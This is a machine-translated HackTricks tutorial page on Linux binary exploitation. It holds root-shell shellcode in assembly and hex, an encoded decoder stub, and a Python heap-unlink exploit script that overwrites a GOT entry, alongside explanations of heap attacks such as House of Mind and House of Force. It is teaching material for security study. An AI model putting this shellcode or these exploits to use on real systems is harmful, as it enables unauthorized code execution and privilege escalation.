# Linux Exploiting (Basic) (SPA)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **2.SHELLCODE**

カーネルの割り込みを表示する: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep “\_\_NR\_”

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(“/bin/sh”, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; eaxをクリア\
xor ebx, ebx ; ebx = 0 なので引数は渡さない\
mov al, 0x01 ; eax = 1 —> \_\_NR\_exit 1\
int 0x80 ; システムコールを実行

**nasm -f elf assembly.asm** —> .oファイルを返す\
**ld assembly.o -o shellcodeout** —> アセンブリコードから形成された実行可能ファイルを得て、**objdump**でオペコードを抽出できる\
**objdump -d -Mintel ./shellcodeout** —> 実際に私たちのシェルコードであることを確認し、オペコードを抽出する

**シェルコードが機能するか確認する**
```
char shellcode[] = “\x31\xc0\x31\xdb\xb0\x01\xcd\x80”

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
システムコールが正しく行われているか確認するには、前述のプログラムをコンパイルし、システムコールが**strace ./PROGRAMA\_COMPILADO**に表示される必要があります。

シェルコードを作成する際にトリックを使うことができます。最初の命令はcallへのジャンプです。callは元のコードを呼び出し、さらにEIPをスタックに入れます。call命令の後に必要な文字列を入れているため、そのEIPを使って文字列を指し示し、さらにコードの実行を続けることができます。

EJ **トリック (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al último call
popl                %esi                                       ; Guardamos en ese la dirección al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=“/bin/sh”
leal                 0x8(%esi), %ecx      ; arg[2] = {“/bin/sh”, “0”}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(“/bin/sh”, [“/bin/sh”, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instrución
.string             \”/bin/sh\”                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
**EJ スタックを使用して (/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; “\0”
push               dword 0x68732f2f ; “//sh”
push               dword 0x6e69622f; “/bin”
mov                ebx, esp                     ; arg1 = “/bin//sh\0”
push               eax                             ; Null -> args[1]
push               ebx                             ; “/bin/sh\0” -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(“/bin/sh”, args[“/bin/sh”, “NULL”], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutó fabs
…
```
**Egg Huter:**

プロセスに関連付けられたメモリページを走査し、そこに保存されたシェルコードを探す小さなコードで構成されています（シェルコードに設定された署名を探します）。コードを注入するための小さなスペースしかない場合に便利です。

**Shellcodes polimórficos**

暗号化されたシェルで構成されており、それを復号化してジャンプする小さなコードを持っています。Call-Popのトリックを使用して、これは**暗号化されたシーザーの例**です：
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerá)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aquí va el shellcode
```
## **5.補完的手法**

**ムラト技術**

Linuxではすべてのプログラムは0xbfffffffからマッピングされます。

Linuxで新しいプロセスのスタックがどのように構築されるかを見ることで、プログラムがシェルコードのみを持つ環境で起動されるようにエクスプロイトを開発できます。このアドレスは次のように計算できます: addr = 0xbfffffff - 4 - strlen(完全な実行可能ファイル名) - strlen(shellcode)

このようにして、シェルコードを持つ環境変数のアドレスを簡単に取得できます。

これは、execle関数が必要な環境変数のみを持つ環境を作成できるため可能です。

###

###

###

###

###

### **フォーマット文字列によるバッファオーバーフロー**

**sprintf**はフォーマットされた文字列を**変数に移動**します。したがって、文字列の**フォーマット**を悪用して、内容がコピーされる**変数でバッファオーバーフローを引き起こす**ことができます。\
例えば、ペイロード`%.44xAAAA`は**変数に44B+"AAAA"を書き込み**、これによりバッファオーバーフローを引き起こす可能性があります。

### **\_\_atexit構造体**

{% hint style="danger" %}
現在、これをエクスプロイトするのは非常に**奇妙です**。
{% endhint %}

**`atexit()`**は、**他の関数がパラメータとして渡される**関数です。これらの**関数**は、**`exit()`**または**main**の**戻り**を実行する際に**実行されます**。\
これらの**関数**のいずれかの**アドレス**をシェルコードを指すように**変更**できれば、**プロセスの制御を得る**ことができますが、現在はこれがより複雑です。\
現在、実行される**関数へのアドレス**は、いくつかの構造の背後に**隠されており**、最終的に指すアドレスは関数のアドレスではなく、**XORで暗号化され**、**ランダムキー**でオフセットされています。したがって、現在この攻撃ベクターは**x86**および**x64\_86**ではあまり役に立ちません。\
**暗号化関数**は**`PTR_MANGLE`**です。**m68k、mips32、mips64、aarch64、arm、hppa**などの**他のアーキテクチャ**は、**暗号化**関数を実装していません。なぜなら、それは**入力として受け取ったものと同じ**を返すからです。したがって、これらのアーキテクチャはこのベクターで攻撃可能です。

### **setjmp() & longjmp()**

{% hint style="danger" %}
現在、これをエクスプロイトするのは非常に**奇妙です**。
{% endhint %}

**`setjmp()`**は**コンテキスト**（レジスタ）を**保存**することを可能にします。\
**`longjmp()`**は**コンテキスト**を**復元**することを可能にします。\
**保存されたレジスタ**は: `EBX, ESI, EDI, ESP, EIP, EBP`\
問題は、EIPとESPが**`PTR_MANGLE`**関数によって渡されることです。したがって、**この攻撃に対して脆弱なアーキテクチャは上記と同じです**。\
これらはエラー回復や割り込みに役立ちます。\
しかし、私が読んだところによれば、他のレジスタは保護されていないため、**関数内に`call ebx`、`call esi`、または`call edi`**がある場合、制御を奪うことができます。また、EBPを変更してESPを変更することもできます。

**C++におけるVTableとVPTR**

各クラスには**Vtable**があり、これは**メソッドへのポインタの配列**です。

各**クラス**のオブジェクトには**VPtr**があり、これはそのクラスの配列への**ポインタ**です。VPtrは各オブジェクトのヘッダーの一部であるため、**VPtr**の**上書き**が成功すれば、ダミーメソッドを指すように**変更**でき、関数を実行するとシェルコードに飛ぶことができます。

## **予防措置と回避策**

###

**Libsafeの置き換え**

次のようにアクティブ化されます: LD\_PRELOAD=/lib/libsafe.so.2\
または\
“/lib/libsave.so.2” > /etc/ld.so.preload

不安全な関数への呼び出しを安全なものに置き換えます。標準化されていません。（x86専用、-fomit-frame-pointerでコンパイルされたものには適用されず、静的コンパイルには適用されず、すべての脆弱な関数が安全になるわけではなく、LD\_PRELOADはsuidバイナリには機能しません）。

**ASCII装甲アドレス空間**

共有ライブラリを0x00000000から0x00ffffffまで読み込むことで、常にバイト0x00が存在するようにします。しかし、これは実際にはほとんどの攻撃を防ぐことはできず、特にリトルエンディアンでは効果がありません。

**ret2plt**

ROPを実行してstrcpy@plt（pltの）を呼び出し、GOTのエントリを指し、呼び出したい関数の最初のバイト（system()）をコピーします。その後、GOT+1を指し、system()の2バイト目をコピーします… 最後に、GOTに保存されたアドレスを呼び出します。これがsystem()になります。

**chroot()によるサンドボックス**

debootstrap -arch=i386 hardy /home/user —> 特定のサブディレクトリに基本システムをインストールします。

管理者は次のようにしてこれらのサンドボックスから出ることができます: mkdir foo; chroot foo; cd ..

**コードのインストゥルメンテーション**

Valgrind —> エラーを探します。\
Memcheck\
RAD（リターンアドレスディフェンダー）\
Insure++

## **8 ヒープオーバーフロー: 基本的なエクスプロイト**

**割り当てられたチャンク**

prev\_size |\
size | —ヘッダー\
\*mem | データ

**空きチャンク**

prev\_size |\
size |\
\*fd | 前方チャンクへのポインタ\
\*bk | 後方チャンクへのポインタ —ヘッダー\
\*mem | データ

空きチャンクは双方向リスト（bin）にあり、2つの空きチャンクが隣接することはありません（結合されます）。

“size”には、前のチャンクが使用中かどうか、チャンクがmmap()によって割り当てられたかどうか、チャンクがプライマリアリーナに属するかどうかを示すビットがあります。

チャンクを解放する際に、隣接するチャンクのいずれかが空いている場合、これらはunlink()マクロを介して結合され、新しい大きなチャンクがfrontlink()に渡され、適切なbinに挿入されます。

unlink(){\
BK = P->bk; —> 新しいチャンクのBKは、以前に空いていたチャンクのBKです。\
FD = P->fd; —> 新しいチャンクのFDは、以前に空いていたチャンクのFDです。\
FD->bk = BK; —> 次のチャンクのBKは新しいチャンクを指します。\
BK->fd = FD; —> 前のチャンクのFDは新しいチャンクを指します。\
}

したがって、P->bkをシェルコードのアドレスに、P->fdをGOTまたはDTORSのエントリのアドレス-12に変更することができれば、次のようになります:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

これにより、プログラム終了時にシェルコードが実行されます。

さらに、unlink()の4番目の文は何かを書き込み、シェルコードはこれに対して修正される必要があります:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) —> これにより、シェルコードの8バイト目から4バイトが書き込まれるため、シェルコードの最初の命令はこれをスキップして残りのシェルコードに飛ぶためのjmpである必要があります。

したがって、エクスプロイトは次のように作成されます:

buffer1にシェルコードを入れ、最初にjmpを入れてnopsまたはシェルコードの残りに飛ぶようにします。

シェルコードの後に、次のチャンクのprev\_sizeとsizeフィールドに到達するまでパディングを入れます。これらの場所に0xfffffff0（prev\_sizeが空いていることを示すビットを持つように上書きされる）と“-4”（0xfffffffc）をsizeに入れます（3番目のチャンクで2番目が実際に空いているかどうかを確認する際に、変更されたprev\_sizeに行くようにします） -> これにより、free()が調査すると、3番目のsizeに行きますが、実際には2番目の-4に行き、2番目のチャンクが空いていると考えます。そして、**unlink()**を呼び出します。

unlink()を呼び出すと、P->fdとして2番目のチャンクの最初のデータを使用するため、そこに上書きしたいアドレス-12（FD->bkに12を加算します）を入れます。そして、そのアドレスに2番目のチャンクで見つけた2番目のアドレスを入れます。これがシェルコードへのアドレス（偽のP->bk）になります。

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12バイトのパディング**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I”, 0xfffffff0) #前のチャンクが空いていることを示すビットが1であることが重要です**

**fake\_size = pack("\<I”, 0xfffffffc) #-4、3番目のチャンクの“size”が4バイト後ろにあると考えさせるため（prev\_sizeを指す）**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #ペイロードの最初に8バイトのパディングを入れます**

**got\_free = pack("\<I", 0x08048300 - 12) #free()のアドレスをplt-12に（シェルコードを呼び出すために上書きされるアドレス）**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #ペイロードは最初に8バイトのパディングから始まります**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #2番目のチャンクを変更し、got\_freeはaddr\_sc + 12のアドレスを保存する場所を指します**

**os.system("./8.3.o " + payload)**

**unset() 逆順で解放（wargame）**

3つの連続したチャンクを制御しており、予約された順序とは逆に解放されます。

その場合:

チャンクcにシェルコードを置きます。

チャンクaを使用してbを上書きし、sizeがPREV\_INUSEビットをオフにして、チャンクaが空いていると考えさせます。

さらに、bのヘッダーのsizeを-4に上書きします。

これにより、プログラムは“a”が空いていると考え、binに入るため、unlink()を呼び出します。しかし、ヘッダーのPREV\_SIZEが-4であるため、チャンク“a”は実際にはb+4から始まると考えます。つまり、b+4から始まるチャンクにunlink()を行い、b+12にfdポインタがあり、b+16にbkポインタがあります。

このようにして、bkにシェルコードのアドレスを、fdに“puts()”のアドレス-12を入れることで、ペイロードが完成します。

**フロントリンク技術**

フロントリンクは、何かを解放したときにその隣接するチャンクが空いていない場合に呼び出され、unlink()ではなく直接frontlink()が呼び出されます。

mallocが攻撃されるときに決して解放されない場合に有用です。

必要なもの:

データ入力関数でオーバーフローできるバッファ

この隣接するバッファは解放され、前のバッファのオーバーフローによってヘッダーのfdフィールドが変更されます。

サイズが512より大きいが前のバッファより小さいバッファ

この3番目のバッファのprev\_sizeを上書きできるように、前に宣言されたバッファ

このようにして、2つのmallocを制御不能に上書きし、1つを制御された形で解放することで、エクスプロイトを作成できます。

**ダブルフリー()の脆弱性**

同じポインタでfree()を2回呼び出すと、2つのbinが同じアドレスを指します。

1つを再利用しようとすると、問題なく割り当てられます。別のものを使用しようとすると、同じスペースが割り当てられるため、ポインタ“fd”と“bk”が以前の予約によって書き込まれたデータで偽装されます。

**free()後**

以前に解放されたポインタが再び制御なしに使用されます。

## **8 ヒープオーバーフロー: 高度なエクスプロイト**

unlink()とfrontlink()の技術は、unlink()関数を変更することで削除されました。

**心の家**

任意のコードを実行するには、free()を1回呼び出すだけで済みます。攻撃者が前のチャンクによってオーバーフローされ、解放される可能性のある2番目のチャンクを探すことが重要です。

free()の呼び出しはpublic\_fREe(mem)を呼び出し、これを行います:

mstate ar\_ptr;

mchunkptr p;

…

p = mem2chunk(mem); —> チャンクの開始アドレスへのポインタを返します（mem-8）

…

ar\_ptr = arena\_for\_chunk(p); —> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

…

\_int\_free(ar\_ptr, mem);

}

\[1]では、sizeフィールドのNON\_MAIN\_ARENAビットを確認し、このビットを変更してチェックがtrueを返すようにし、heap\_for\_ptr()を実行します。これにより、memの最も重要でない2.5バイトが0に設定され（この場合0x0804a000から0x08000000になります）、0x08000000->ar\_ptrにアクセスします（heap\_info構造体のように）。

このようにして、例えば0x0804a000のチャンクを制御でき、**0x081002a0**でチャンクが解放されると、0x08100000に到達し、任意のものを書き込むことができます。例えば**0x0804a000**。この2番目のチャンクが解放されると、heap\_for\_ptr(ptr)->ar\_ptrは0x08100000に書き込まれたものを返します（前述のandが0x081002a0に適用され、最初の4バイトの値が取得されます）。

このようにして、\_int\_free(ar\_ptr, mem)が呼び出されます。つまり、**\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
…\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

前述のように、avの値を制御できることがわかります。これは、解放されるチャンクに書き込んだものです。

unsorted\_chunksが定義されているように、次のことがわかります:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

したがって、av->bins\[2]に\_\_DTOR\_END\_\_-12の値を書き込むと、最後の命令で\_\_DTOR\_END\_\_に2番目のチャンクのアドレスが書き込まれます。

つまり、最初のチャンクの最初に\_\_DTOR\_END\_\_-12のアドレスを何度も入れる必要があります。なぜなら、av->bins\[2]がそこから取得するからです。

2番目のチャンクのアドレスに最後の5つのゼロがある場合、最初のチャンクのアドレスを書き込む必要があります。これにより、heap\_for\_ptr()はar\_ptrが最初のチャンクの開始位置にあると考え、av->bins\[2]を取得します。

2番目のチャンクでは、最初のチャンクのおかげでprev\_sizeを0x0cのjmpで上書きし、sizeをNON\_MAIN\_ARENAを有効にするための何かにします。

次に、チャンク2にたくさんのnopsを置き、最後にシェルコードを置きます。

このようにして、\_int\_free(TROZO1, TROZO2)が呼び出され、TROZO2のprev\_sizeにシェルコードへのアドレスが書き込まれます。

この技術を適用するには、ペイロードを少し複雑にするためにいくつかの要件を満たす必要があります。

この技術は、unlinkに対してほぼ同じパッチが適用されたため、もはや適用できません。新しいポインタが自分自身を指しているかどうかを比較します。

**ファストビン**

これは心の家の変種です。

次のコードを実行するために必要です。これは、\_int\_free()関数の最初のチェックを通過した後に到達します。

fb = &(av->fastbins\[fastbin\_index(size)] —> fastbin\_index(sz) —> (sz >> 3) - 2

…

p->fd = \*fb

\*fb = p

このようにして、fbにGOTの関数のアドレスを入れると、そのアドレスに上書きされたチャンクのアドレスが入ります。これを行うには、アリーナがdtorsのアドレスの近くにある必要があります。より正確には、av->max\_fastが上書きするアドレスにある必要があります。

心の家で見たように、avの位置を制御できることがわかります。

したがって、sizeフィールドに8 + NON\_MAIN\_ARENA + PREV\_INUSEのサイズを入れると、fastbin\_index()はfastbins\[-1]を返し、av->max\_fastを指します。

この場合、av->max\_fastは上書きされるアドレスになります（指すのではなく、その位置が上書きされます）。

さらに、解放されたチャンクの隣接チャンクは8より大きくなければなりません -> 先ほど解放されたチャンクのサイズが8であるため、この偽のチャンクには8より大きいサイズを入れる必要があります（シェルコードが解放されたチャンクに入るため、最初にnopsに飛ぶjmpを入れる必要があります）。

さらに、この偽のチャンクはav->system\_memより小さくなければなりません。av->system\_memは1848バイト先にあります。

\_\_DTOR\_END\_のゼロとGOTのアドレスの少なさのため、これらのセクションのアドレスは上書きするのに適していないため、スタックを攻撃するためにファストビンを適用する方法を見てみましょう。

別の攻撃方法は、**av**をスタックにリダイレクトすることです。

サイズを8ではなく16に変更すると、fastbin\_index()はfastbins\[0]を返し、これを使用してスタックを上書きできます。

これを行うには、canaryやスタックに奇妙な値がない必要があります。実際、次のようにする必要があります: 4バイトのゼロ + EBP + RET

4バイトのゼロは、**av**がこのアドレスにある必要があり、**av**の最初の要素はミューテックスで0である必要があります。

**av->max\_fast**はEBPであり、制約を回避するために役立つ値になります。

**av->fastbins\[0]**は**p**のアドレスで上書きされ、RETになります。これにより、シェルコードに飛びます。

さらに、**av->system\_mem**（スタックの位置から1484バイト上）には、チェックを回避するための十分なゴミが含まれます。

さらに、解放されたチャンクの隣接チャンクは8より大きくなければなりません -> 先ほど解放されたチャンクのサイズが16であるため、この偽のチャンクには8より大きいサイズを入れる必要があります（シェルコードが解放されたチャンクに入るため、最初にnopsに飛ぶjmpを入れる必要があります）。

**精神の家**

この場合、攻撃者によって変更可能なmallocへのポインタを持つことを目指します（例えば、ポインタが変数へのオーバーフローの下にスタックにある場合）。

このようにして、このポインタを任意の場所に指すようにすることができます。しかし、どの場所でも有効ではなく、偽のチャンクのサイズはav->max\_fastより小さく、より具体的には、将来のmalloc()呼び出しで要求されたサイズ+8と等しくなければなりません。したがって、この脆弱なポインタの後にmalloc(40)が呼び出されることがわかっている場合、偽のチャンクのサイズは48と等しくなければなりません。

例えば、プログラムがユーザーに数字を尋ねる場合、48を入力して、変更可能なmallocポインタを次の4バイト（運が良ければEBPに属する可能性がある）に指すことができます。したがって、48は後ろにあり、サイズヘッダーのように見えます。さらに、ptr-4+48のアドレスは複数の条件を満たす必要があります（この場合ptr=EBP）、つまり、8 < ptr-4+48 < av->system\_mem。

これが満たされると、次のmallocがmalloc(40)と呼ばれるとき、EBPのアドレスが割り当てられます。攻撃者がこのmallocに書き込むことができる場合、EBPとEIPを任意のアドレスで上書きできます。

これは、free()が解放する際に、スタックのEBPを指すアドレスに対して新しいmalloc()のために完璧なサイズのチャンクがあることを記録するために行われると思われます。

**力の家**

必要なもの:

* wildernessを上書きできるチャンクへのオーバーフロー
* ユーザーによって定義されたサイズでmalloc()を呼び出す
* ユーザーによって定義されたデータを持つmalloc()を呼び出す

最初に行うことは、wildernessチャンクのサイズを非常に大きな値（0xffffffff）で上書きすることです。これにより、十分に大きなメモリ要求は\_int\_malloc()で処理され、ヒープを拡張する必要がなくなります。

次に、av->topを攻撃者の制御下にあるメモリ領域、例えばスタックを指すように変更します。av->topには\&EIP - 8が設定されます。

av->topを攻撃者の制御下にあるメモリ領域を指すように上書きする必要があります:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victimは現在のwildernessチャンクのアドレス（現在のav->top）の値を取得し、remainderはそのアドレスにmalloc()で要求されたバイト数を加えたものです。したがって、もし\&EIP-8が0xbffff224にあり、av->topが0x080c2788を含んでいる場合、次のmalloc()のためにav->topが$EIP-8を指すようにするために、制御されたmallocで予約する必要がある量は:

0xbffff224 - 0x080c2788 = 3086207644。

このようにして、av->topに変更された値が保存され、次のmallocはEIPを指し、上書きすることができます。

新しいwildernessチャンクのサイズが、最後のmalloc()によって行われた要求よりも大きいことが重要です。つまり、wildernessが\&EIP-8を指している場合、サイズはスタックのEBPフィールドに正確に配置されます。

**伝説の家**

**SmallBinの破損**

解放されたチャンクは、そのサイズに基づいてbinに挿入されます。しかし、挿入される前にunsorted binsに保存されます。チャンクが解放されると、すぐにそのbinに入るのではなく、unsorted binsに留まります。次に、新しいチャンクが予約され、以前に解放されたチャンクが役立つ場合、それを返しますが、より大きなものが予約されると、unsorted binsにある解放されたチャンクが適切なbinに挿入されます。

脆弱なコードに到達するには、メモリ要求がav->max\_fast（通常72）より大きく、MIN\_LARGE\_SIZE（512）より小さくなければなりません。

binに要求されたサイズに適したチャンクがある場合、それが返され、アンリンクされます:

bck = victim->bk; 前のチャンクを指します。これが唯一の情報です。

bin->bk = bck; 前のチャンクが最後のチャンクになります。bckがスタックを指している場合、次に予約されるチャンクにこのアドレスが与えられます。

bck->fd = bin; このリストを閉じ、これがbinを指すようにします。

必要なもの:

2つのmallocを予約し、最初のものが解放された後にオーバーフローできるようにします（つまり、2番目のチャンクが解放され、binに挿入された後に、より大きなmallocが予約される必要があります）。

攻撃者が選択したアドレスを持つmallocが攻撃者によって制御される必要があります。

目的は次のとおりです。もし、ヒープの下にすでに解放されたチャンクがあり、そのbinにある場合、bkポインタを変更できます。bkポインタを変更し、このチャンクがbinの最初のものになり、予約されると、binを欺いて、リストの最後のチャンク（次に提供されるもの）が、攻撃者が指定した偽のアドレスにあると認識させることができます（スタックやGOTなど）。したがって、再度別のチャンクが予約され、攻撃者がその権限を持っている場合、希望する位置にチャンクが与えられ、そこに書き込むことができます。

変更されたチャンクを解放した後、解放されたものよりも大きなチャンクを予約する必要があります。これにより、変更されたチャンクがunsorted binsから出て、適切なbinに挿入されます。

binに入ったら、オーバーフローを介してbkポインタを変更して、上書きしたいアドレスを指すようにします。

このようにして、binはmalloc()が十分に呼び出されるのを待つ必要があります。これにより、変更されたbinが再利用され、次のチャンクが偽のアドレスにあると信じ込ませます。そして、次に興味のあるチャンクが提供されます。

脆弱性をできるだけ早く実行するには、理想的には次のようになります: 脆弱なチャンクの予約、変更されるチャンクの予約、このチャンクの解放、より大きなチャンクの予約、チャンクの変更（脆弱性）、脆弱なサイズと同じサイズのチャンクの予約、そしてこのチャンクが選択したアドレスを指すことになります。

この攻撃を防ぐために、チャンクが「偽」でないことを確認するための典型的なチェックが使用されます: bck->fdがvictimを指しているかどうかを確認します。つまり、私たちのケースでは、スタックで指されている偽のチャンクのポインタfd*がvictimを指しているかどうかです。この保護を回避するために、攻撃者は何らかの方法で（おそらくスタックを介して）適切なアドレスにvictimのアドレスを書き込むことができる必要があります。そうすれば、真のチャンクのように見えます。

**LargeBinの破損**

以前と同じ要件が必要で、さらに、予約されたチャンクは512より大きくなければなりません。

攻撃は前と同様で、bkポインタを変更する必要があり、すべてのmalloc()呼び出しが必要ですが、さらに、変更されたチャンクのサイズをそのサイズ - nbが<MINSIZEになるように変更する必要があります。

例えば、サイズを1552に設定すると、1552 - 1544 = 8 < MINSIZEになります（引き算は負になってはいけません。なぜなら、unsignedが比較されるからです）。

さらに、さらに複雑にするためのパッチが導入されました。

**ヒープスプレー**

基本的には、可能な限りすべてのヒープメモリを予約し、これをnopsのマットレスとシェルコードで埋めることを意味します。さらに、マットレスとして0x0cを使用します。これにより、0x0c0c0c0cのアドレスに飛ぼうとし、そこに呼び出されるアドレスが上書きされると、そこに飛びます。基本的に、この戦術は、できるだけ多くの予約を行い、ポインタが上書きされるかどうかを確認し、0x0c0c0c0cに飛ぶことを期待しています。

**ヒープ風水**

予約と解放を通じて、メモリをセグメント化し、空きチャンクの間に予約されたチャンクを配置します。オーバーフローするバッファは、これらの卵の1つに配置されます。

**objdump -d 実行可能ファイル** —> 関数を逆アセンブルします。\
**objdump -d ./PROGRAM | grep FUNCTION** —> 関数アドレスを取得します。\
**objdump -d -Mintel ./shellcodeout** —> 実際にシェルコードであることを確認し、OpCodesを取得します。\
**objdump -t ./exec | grep varBss** —> シンボルテーブル、変数と関数のアドレスを取得します。\
**objdump -TR ./exec | grep exit(func lib)** —> ライブラリ関数のアドレスを取得します（GOT）。\
**objdump -d ./exec | grep funcCode**\
**objdump -s -j .dtors /exec**\
**objdump -s -j .got ./exec**\
**objdump -t --dynamic-relo ./exec | grep puts** —> GOTで上書きするputsのアドレスを取得します。\
**objdump -D ./exec** —> pltのエントリまで全てを逆アセンブルします。\
**objdump -p -/exec**\
**Info functions strncmp —>** gdbでの関数情報

## 興味深いコース

* [https://guyinatuxedo.github.io/](https://guyinatuxedo.github.io)
* [https://github.com/RPISEC/MBE](https://github.com/RPISEC/MBE)
* [https://ir0nstone.gitbook.io/notes](https://ir0nstone.gitbook.io/notes)

## **参考文献**

* [**https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html**](https://guyinatuxedo.github.io/7.2-mitigation\_relro/index.html)

{% hint style="success" %}
AWSハッキングを学び、実践する:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPハッキングを学び、実践する: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で**フォロー**してください 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ハッキングトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>
{% endhint %}
